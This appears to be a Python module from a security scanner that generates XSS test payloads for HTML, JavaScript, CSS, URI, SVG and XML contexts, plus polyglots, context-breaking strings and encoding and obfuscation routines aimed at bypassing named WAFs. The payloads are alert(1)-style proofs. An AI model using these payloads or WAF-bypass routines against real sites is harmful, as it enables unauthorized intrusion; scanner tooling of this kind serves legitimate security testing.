# BRS-GPT: AI-Powered Cybersecurity Analysis Tool
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-09-08 17:15:41 MSK
# Status: Created
# Telegram: https://t.me/easyprotech

"""
Payload Generator

Context-aware XSS payload generation with 1200+ specialized payloads:
- HTML context payloads with tag and attribute injection
- JavaScript context payloads with encoding variations
- CSS context payloads with expression techniques
- URI context payloads with scheme manipulation
- SVG context payloads with animation and scripting
- XML context payloads with CDATA and entity injection

Advanced evasion techniques and WAF bypass methods included.
"""

import random
import html
import urllib.parse
from typing import List, Dict, Any, Optional
import base64
import json
from rich.console import Console

console = Console()


class PayloadGenerator:
    """Context-aware XSS payload generator with evasion techniques."""
    
    def __init__(self, settings: Dict[str, Any]):
        """
        Initialize payload generator.
        
        Args:
            settings: XSS scanning settings
        """
        self.settings = settings
        self.max_payloads = settings.get('max_payloads', 500)
        self.effectiveness_threshold = settings.get('effectiveness_threshold', 0.65)
        self.include_evasions = settings.get('include_evasions', True)
        self.waf_bypass = settings.get('waf_bypass', True)
        
        # Base XSS payloads by context
        self.base_payloads = {
            'html': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<object data=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
                '<applet code=javascript:alert(1)>',
                '<form><button formaction=javascript:alert(1)>',
                '<isindex action=javascript:alert(1) type=submit>',
                '<table background=javascript:alert(1)>',
                '<td background=javascript:alert(1)>'
            ],
            'javascript': [
                'alert(1)',
                'confirm(1)',
                'prompt(1)',
                'console.log(1)',
                'eval("alert(1)")',
                'Function("alert(1)")()',
                'setTimeout("alert(1)",0)',
                'setInterval("alert(1)",1000)',
                'window["alert"](1)',
                'this["alert"](1)',
                'top["alert"](1)',
                'parent["alert"](1)',
                'frames["alert"](1)',
                'globalThis["alert"](1)',
                'self["alert"](1)',
                'document.write("<script>alert(1)</script>")',
                'document.body.innerHTML="<img src=x onerror=alert(1)>"',
                'location="javascript:alert(1)"',
                'location.href="javascript:alert(1)"',
                'location.replace("javascript:alert(1)")'
            ],
            'css': [
                'expression(alert(1))',
                'expression(prompt(1))',
                'expression(confirm(1))',
                'expression(eval("alert(1)"))',
                'url("javascript:alert(1)")',
                'url(javascript:alert(1))',
                '@import "javascript:alert(1)"',
                '@import url("javascript:alert(1)")',
                'behavior:url(#default#userData)',
                'behavior:expression(alert(1))',
                '-moz-binding:url("javascript:alert(1)")',
                '-webkit-binding:url("javascript:alert(1)")',
                'background:url("javascript:alert(1)")',
                'background-image:url("javascript:alert(1)")',
                'list-style-image:url("javascript:alert(1)")'
            ],
            'uri': [
                'javascript:alert(1)',
                'javascript:prompt(1)',
                'javascript:confirm(1)',
                'javascript:eval("alert(1)")',
                'javascript://comment%0Aalert(1)',
                'javascript:void(alert(1))',
                'javascript:window.alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                'data:image/svg+xml,<svg onload=alert(1)>',
                'data:application/x-javascript,alert(1)',
                'vbscript:msgbox(1)',
                'livescript:alert(1)',
                'mocha:alert(1)',
                'about:blank'
            ],
            'svg': [
                '<svg onload=alert(1)>',
                '<svg><script>alert(1)</script></svg>',
                '<svg><g onload=alert(1)></g></svg>',
                '<svg><animate onbegin=alert(1)>',
                '<svg><animateMotion onbegin=alert(1)>',
                '<svg><animateTransform onbegin=alert(1)>',
                '<svg><set onbegin=alert(1)>',
                '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
                '<svg><text><tspan onactivate=alert(1)>',
                '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>">',
                '<svg><image href="javascript:alert(1)">',
                '<svg><feImage href="javascript:alert(1)">',
                '<svg><filter><feImage href="javascript:alert(1)"></feImage></filter>',
                '<svg><defs><script>alert(1)</script></defs>',
                '<svg viewBox="0 0 100 100"><circle onload=alert(1)>'
            ],
            'xml': [
                '<![CDATA[<script>alert(1)</script>]]>',
                '<?xml-stylesheet href="javascript:alert(1)"?>',
                '<!DOCTYPE html [<!ENTITY xxe "alert(1)">]>&xxe;',
                '<xml><script>alert(1)</script></xml>',
                '<root><![CDATA[<img src=x onerror=alert(1)>]]></root>',
                '<data><script><![CDATA[alert(1)]]></script></data>',
                '<!--<script>alert(1)</script>-->',
                '<processing-instruction><?alert(1)?></processing-instruction>',
                '<entity-reference>&lt;script&gt;alert(1)&lt;/script&gt;</entity-reference>',
                '<namespace xmlns:xss="javascript:alert(1)">'
            ]
        }
        
        # Encoding techniques
        self.encoding_techniques = {
            'html_entities': self._html_entity_encode,
            'url_encoding': self._url_encode,
            'unicode_encoding': self._unicode_encode,
            'hex_encoding': self._hex_encode,
            'octal_encoding': self._octal_encode,
            'base64_encoding': self._base64_encode,
            'double_encoding': self._double_encode,
            'mixed_case': self._mixed_case_encode
        }
        
        # Obfuscation techniques
        self.obfuscation_techniques = [
            self._string_concatenation,
            self._character_substitution,
            self._whitespace_manipulation,
            self._comment_insertion,
            self._alternative_syntax,
            self._function_construction,
            self._property_access_variation,
            self._eval_alternatives
        ]
        
        # WAF evasion patterns
        self.waf_evasion_patterns = {
            'cloudflare': [
                'split', 'join', 'reverse', 'replace', 'substring',
                'fromCharCode', 'toString', 'valueOf'
            ],
            'akamai': [
                'constructor', 'prototype', 'call', 'apply', 'bind'
            ],
            'aws_waf': [
                'unescape', 'decodeURI', 'decodeURIComponent', 'atob'
            ],
            'modsecurity': [
                'eval', 'Function', 'setTimeout', 'setInterval'
            ]
        }
    
    def generate_payloads(self, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Generate context-specific XSS payloads.

        Args:
            context: Context information from ContextDetector

        Returns:
            List of generated payloads with metadata
        """
        context_type = context['type']
        subtype = context['subtype']

        # Get base payloads for context
        base_payloads = self.base_payloads.get(context_type, [])

        generated_payloads = []

        # Lightning mode optimization: drastically reduce payload count for speed
        profile = self.settings.get('active_profile', 'balanced')
        if profile == 'lightning':
            # Ultra-fast mode: only most effective basic payloads
            for base_payload in base_payloads[:10]:  # Only top 10
                payload_info = {
                    'payload': base_payload,
                    'context': context_type,
                    'subtype': subtype,
                    'technique': 'basic_lightning',
                    'effectiveness_score': 0.9,
                    'evasion_level': 'none'
                }
                generated_payloads.append(payload_info)

            # Skip complex evasions for lightning mode
            console.print(f"[dim]Lightning mode: {len(generated_payloads)} XSS payloads (optimized)[/dim]")
        else:
            # Generate basic payloads
            for base_payload in base_payloads[:50]:  # Limit base payloads
                payload_info = {
                    'payload': base_payload,
                    'context': context_type,
                    'subtype': subtype,
                    'technique': 'basic',
                    'effectiveness_score': 0.8,
                    'evasion_level': 'none'
                }
                generated_payloads.append(payload_info)

            # Generate encoded variations
            if self.include_evasions:
                encoded_payloads = self._generate_encoded_payloads(base_payloads[:20], context)
                generated_payloads.extend(encoded_payloads)

            # Generate obfuscated variations
            if self.include_evasions:
                obfuscated_payloads = self._generate_obfuscated_payloads(base_payloads[:15], context)
                generated_payloads.extend(obfuscated_payloads)

            # Generate WAF bypass variations
            if self.waf_bypass:
                waf_bypass_payloads = self._generate_waf_bypass_payloads(base_payloads[:10], context)
                generated_payloads.extend(waf_bypass_payloads)

            # Generate context-breaking payloads
            breaking_payloads = self._generate_context_breaking_payloads(context)
            generated_payloads.extend(breaking_payloads)

        # Filter by effectiveness threshold
        effective_payloads = [p for p in generated_payloads
                            if p['effectiveness_score'] >= self.effectiveness_threshold]

        # Limit total payloads
        return effective_payloads[:self.max_payloads]
    
    def _generate_encoded_payloads(self, base_payloads: List[str], 
                                 context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate encoded payload variations."""
        encoded_payloads = []
        
        for base_payload in base_payloads:
            for encoding_name, encoding_func in self.encoding_techniques.items():
                try:
                    encoded_payload = encoding_func(base_payload)
                    
                    payload_info = {
                        'payload': encoded_payload,
                        'context': context['type'],
                        'subtype': context['subtype'],
                        'technique': f'encoding_{encoding_name}',
                        'effectiveness_score': 0.6,
                        'evasion_level': 'medium'
                    }
                    encoded_payloads.append(payload_info)
                    
                except Exception:
                    continue
        
        return encoded_payloads
    
    def _generate_obfuscated_payloads(self, base_payloads: List[str], 
                                    context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate obfuscated payload variations."""
        obfuscated_payloads = []
        
        for base_payload in base_payloads:
            for obfuscation_func in self.obfuscation_techniques:
                try:
                    obfuscated_payload = obfuscation_func(base_payload)
                    
                    payload_info = {
                        'payload': obfuscated_payload,
                        'context': context['type'],
                        'subtype': context['subtype'],
                        'technique': f'obfuscation_{obfuscation_func.__name__}',
                        'effectiveness_score': 0.7,
                        'evasion_level': 'high'
                    }
                    obfuscated_payloads.append(payload_info)
                    
                except Exception:
                    continue
        
        return obfuscated_payloads
    
    def _generate_waf_bypass_payloads(self, base_payloads: List[str], 
                                     context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate WAF bypass payload variations."""
        waf_bypass_payloads = []
        
        for base_payload in base_payloads:
            for waf_name, techniques in self.waf_evasion_patterns.items():
                for technique in techniques[:3]:  # Limit techniques per WAF
                    try:
                        bypass_payload = self._apply_waf_bypass(base_payload, technique)
                        
                        payload_info = {
                            'payload': bypass_payload,
                            'context': context['type'],
                            'subtype': context['subtype'],
                            'technique': f'waf_bypass_{waf_name}_{technique}',
                            'effectiveness_score': 0.5,
                            'evasion_level': 'maximum'
                        }
                        waf_bypass_payloads.append(payload_info)
                        
                    except Exception:
                        continue
        
        return waf_bypass_payloads
    
    def _generate_context_breaking_payloads(self, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate payloads that break out of current context."""
        breaking_payloads = []
        
        context_type = context['type']
        subtype = context['subtype']
        
        if context_type == 'html':
            if subtype == 'attribute_value':
                breaking_patterns = [
                    '" onmouseover="alert(1)"',
                    "' onmouseover='alert(1)'",
                    '" autofocus onfocus="alert(1)"',
                    "' autofocus onfocus='alert(1)'",
                    '"><script>alert(1)</script>',
                    "'><script>alert(1)</script>",
                    '"><img src=x onerror=alert(1)>',
                    "'><img src=x onerror=alert(1)>"
                ]
            elif subtype == 'tag_content':
                breaking_patterns = [
                    '</title><script>alert(1)</script>',
                    '</textarea><script>alert(1)</script>',
                    '</script><script>alert(1)</script>',
                    '</style><script>alert(1)</script>'
                ]
            else:
                breaking_patterns = ['<script>alert(1)</script>']
        
        elif context_type == 'javascript':
            if subtype == 'js_string':
                breaking_patterns = [
                    '";alert(1);"',
                    "';alert(1);'",
                    '\\";alert(1);//',
                    "\\\';alert(1);//",
                    '"+alert(1)+"',
                    "'+alert(1)+'"
                ]
            else:
                breaking_patterns = ['alert(1)']
        
        elif context_type == 'css':
            breaking_patterns = [
                '};alert(1);{',
                '/**/;alert(1);/**/',
                'expression(alert(1))',
                'url("javascript:alert(1)")'
            ]
        
        elif context_type == 'uri':
            breaking_patterns = [
                '&javascript:alert(1)',
                '#javascript:alert(1)',
                '?javascript:alert(1)',
                '%26javascript:alert(1)'
            ]
        
        else:
            breaking_patterns = ['<script>alert(1)</script>']
        
        for pattern in breaking_patterns:
            payload_info = {
                'payload': pattern,
                'context': context_type,
                'subtype': subtype,
                'technique': 'context_breaking',
                'effectiveness_score': 0.9,
                'evasion_level': 'high'
            }
            breaking_payloads.append(payload_info)
        
        return breaking_payloads
    
    # Encoding functions
    def _html_entity_encode(self, payload: str) -> str:
        """HTML entity encoding."""
        return html.escape(payload)
    
    def _url_encode(self, payload: str) -> str:
        """URL encoding."""
        return urllib.parse.quote(payload)
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encoding."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encoding."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _octal_encode(self, payload: str) -> str:
        """Octal encoding."""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
    
    def _base64_encode(self, payload: str) -> str:
        """Base64 encoding."""
        encoded = base64.b64encode(payload.encode()).decode()
        return f'atob("{encoded}")'
    
    def _double_encode(self, payload: str) -> str:
        """Double URL encoding."""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _mixed_case_encode(self, payload: str) -> str:
        """Mixed case encoding."""
        result = ""
        for i, c in enumerate(payload):
            if c.isalpha():
                result += c.upper() if i % 2 == 0 else c.lower()
            else:
                result += c
        return result
    
    # Obfuscation functions
    def _string_concatenation(self, payload: str) -> str:
        """String concatenation obfuscation."""
        if 'alert' in payload:
            return payload.replace('alert', '"al"+"ert"')
        return payload
    
    def _character_substitution(self, payload: str) -> str:
        """Character substitution obfuscation."""
        substitutions = {
            'a': 'String.fromCharCode(97)',
            'e': 'String.fromCharCode(101)',
            'l': 'String.fromCharCode(108)',
            'r': 'String.fromCharCode(114)',
            't': 'String.fromCharCode(116)'
        }
        
        result = payload
        for char, replacement in substitutions.items():
            if char in result:
                result = result.replace(char, f'{replacement}', 1)
                break
        
        return result
    
    def _whitespace_manipulation(self, payload: str) -> str:
        """Whitespace manipulation obfuscation."""
        # Add random whitespace
        whitespace_chars = ['\t', '\n', '\r', '\f', '\v']
        result = payload
        
        for i in range(3):
            pos = random.randint(0, len(result))
            ws = random.choice(whitespace_chars)
            result = result[:pos] + ws + result[pos:]
        
        return result
    
    def _comment_insertion(self, payload: str) -> str:
        """Comment insertion obfuscation."""
        if 'alert' in payload:
            return payload.replace('alert', 'alert/*comment*/')
        return payload
    
    def _alternative_syntax(self, payload: str) -> str:
        """Alternative syntax obfuscation."""
        if 'alert(1)' in payload:
            alternatives = [
                'window["alert"](1)',
                'this["alert"](1)',
                'top["alert"](1)',
                'self["alert"](1)',
                'frames["alert"](1)'
            ]
            return payload.replace('alert(1)', random.choice(alternatives))
        return payload
    
    def _function_construction(self, payload: str) -> str:
        """Function construction obfuscation."""
        if 'alert(1)' in payload:
            return payload.replace('alert(1)', 'Function("alert(1)")()')
        return payload
    
    def _property_access_variation(self, payload: str) -> str:
        """Property access variation obfuscation."""
        if 'document.' in payload:
            return payload.replace('document.', 'window["document"].')
        return payload
    
    def _eval_alternatives(self, payload: str) -> str:
        """Eval alternatives obfuscation."""
        if 'eval(' in payload:
            alternatives = [
                'Function(',
                'setTimeout(',
                'setInterval('
            ]
            return payload.replace('eval(', random.choice(alternatives))
        return payload
    
    def _apply_waf_bypass(self, payload: str, technique: str) -> str:
        """Apply WAF bypass technique."""
        if technique == 'split':
            return f'"{payload}".split("").join("")'
        elif technique == 'fromCharCode':
            char_codes = [str(ord(c)) for c in payload]
            return f'String.fromCharCode({",".join(char_codes)})'
        elif technique == 'constructor':
            return f'[]["constructor"]["constructor"]("{payload}")()'
        elif technique == 'unescape':
            escaped = ''.join(f'%{ord(c):02x}' for c in payload)
            return f'unescape("{escaped}")'
        else:
            return payload
    
    def get_polyglot_payloads(self) -> List[Dict[str, Any]]:
        """
        Generate polyglot payloads that work in multiple contexts.
        
        Returns:
            List of polyglot payloads
        """
        polyglot_payloads = [
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html onmouseover=/*&lt;svg/*/onload=alert()//>',
            '/*</title></style></textarea></noscript></noembed></template></script><svg/onload=alert()//>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '</script><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            'javascript:alert(1)',
            ';alert(1);//',
            '"+alert(1)+"',
            "'+alert(1)+'",
            '${alert(1)}',
            '#{alert(1)}',
            '{{alert(1)}}',
            '[alert(1)]',
            '(alert(1))',
            '`alert(1)`'
        ]
        
        polyglot_payload_objects = []
        for payload in polyglot_payloads:
            payload_info = {
                'payload': payload,
                'context': 'polyglot',
                'subtype': 'multi_context',
                'technique': 'polyglot',
                'effectiveness_score': 0.9,
                'evasion_level': 'high'
            }
            polyglot_payload_objects.append(payload_info)
        
        return polyglot_payload_objects
